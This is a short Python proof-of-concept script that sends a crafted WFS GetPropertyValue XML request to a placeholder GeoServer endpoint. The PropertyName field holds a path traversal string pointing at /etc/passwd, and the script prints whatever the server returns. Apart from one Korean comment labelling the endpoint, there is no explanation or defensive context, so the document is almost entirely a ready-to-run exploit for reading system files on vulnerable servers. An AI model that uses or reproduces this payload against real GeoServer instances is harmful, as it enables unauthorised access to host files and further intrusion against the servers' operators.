import requests

url = "http://<target_geoserver>/geoserver/wfs" # GeoServer WFS 엔드포인트
payload = """
<wfs:GetPropertyValue service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0" xmlns:fes="http://www.opengis.net/fes/2.0">
  <wfs:Query typeNames="sf:archsites">
    <fes:PropertyName><![CDATA[//prop/../../../../../../../../../../../../../../../../../../etc/passwd]]></fes:PropertyName>
  </wfs:Query>
</wfs:GetPropertyValue>
"""

headers = {"Content-Type": "application/xml"}
response = requests.post(url, headers=headers, data=payload)

print(response.text)
